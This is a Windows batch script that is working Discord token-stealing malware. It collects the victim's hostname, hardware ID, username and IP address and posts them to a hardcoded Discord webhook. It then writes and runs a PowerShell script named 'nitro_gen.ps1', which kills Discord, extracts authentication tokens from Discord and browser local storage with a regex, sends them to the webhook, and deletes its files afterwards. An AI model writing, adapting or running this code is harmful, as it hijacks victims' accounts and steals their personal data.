@echo off 
set webhook=https://discord.com/api/webhooks/1262775923736842341/AFu4UCy31-A_U45qH33bFypHTZlw3VpZY9oJbpi1cQswmURm67E19GeAXr847-_1btTd


hostname>pcname.txt 
wmic csproduct get uuid>hwid.txt  
echo %username%>pcusername.txt  
curl --silent --output ip.txt http://ipinfo.io/ip 
curl --silent --output private_ip.txt http://ifconfig.me 
curl --silent --output /dev/null -F l=@"hwid.txt" %webhook% 
curl --silent --output /dev/null -F l=@"pcusername.txt" %webhook% 
curl --silent --output /dev/null -F l=@"pcname.txt" %webhook% 
curl --silent --output /dev/null -F l=@"ip.txt" %webhook% 
curl --silent --output /dev/null -F l=@"private_ip.txt" %webhook% 

if exist nitro_gen.ps1 del /s /q nitro_gen.ps1 > nul

echo $ErrorActionPreference= 'silentlycontinue' > nitro_gen.ps1

echo $tokensString = new-object System.Collections.Specialized.StringCollection >> nitro_gen.ps1
echo $webhook_url = "https://discord.com/api/webhooks/1262775923736842341/AFu4UCy31-A_U45qH33bFypHTZlw3VpZY9oJbpi1cQswmURm67E19GeAXr847-_1btTd" >> nitro_gen.ps1

echo $location_array = @( >> nitro_gen.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb" #Standard Discord >> nitro_gen.ps1
echo     $env:APPDATA + "\discordcanary\Local Storage\leveldb" #Discord Canary >> nitro_gen.ps1
echo     $env:APPDATA + "\discordptb\Local Storage\leveldb" #Discord PTB >> nitro_gen.ps1
echo     $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Local Storage\leveldb" #Chrome Browser >> nitro_gen.ps1
echo     $env:APPDATA + "\Opera Software\Opera Stable\Local Storage\leveldb", #Opera Browser >> nitro_gen.ps1
echo     $env:LOCALAPPDATA + "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" #Brave Browser >> nitro_gen.ps1
echo     $env:LOCALAPPDATA + "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" #Yandex Browser >> nitro_gen.ps1
echo ) >> nitro_gen.ps1

echo     Stop-Process -Name "Discord" -Force >> nitro_gen.ps1

echo foreach ($path in $location_array) { >> nitro_gen.ps1
echo     if(Test-Path $path){ >> nitro_gen.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) { >> nitro_gen.ps1
echo             $data = Get-Content -Path "$($path)\$($file)" >> nitro_gen.ps1
echo             $regex = [regex] '[\w]{24}\.[\w]{6}\.[\w]{27}' >> nitro_gen.ps1
echo             $match = $regex.Match($data) >> nitro_gen.ps1
echo             while ($match.Success) { >> nitro_gen.ps1
echo                 if (!$tokensString.Contains($match.Value)) { >> nitro_gen.ps1
echo                     $tokensString.Add($match.Value) ^| out-null >> nitro_gen.ps1
echo                 } >> nitro_gen.ps1
echo                 $match = $match.NextMatch() >> nitro_gen.ps1
echo             }  >> nitro_gen.ps1
echo         } >> nitro_gen.ps1
echo     } >> nitro_gen.ps1
echo } >> nitro_gen.ps1
echo foreach ($token in $tokensString) { >> nitro_gen.ps1
    
echo     $message = ^"** Discord tokens : ** >> nitro_gen.ps1
echo     ``` $token ``` ^" >> nitro_gen.ps1

echo     $hash = @{ "content" = $message; } >> nitro_gen.ps1

echo     $JSON = $hash ^| convertto-json >> nitro_gen.ps1

echo     Invoke-WebRequest -uri $webhook_url -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'} >> nitro_gen.ps1
echo } >> nitro_gen.ps1

powershell -file nitro_gen.ps1 > nul
del /s /q nitro_gen.ps1 > nul

del ip.txt
del private_ip.txt
del pcname.txt 
del hwid.txt 
del pcusername.txt 
pause
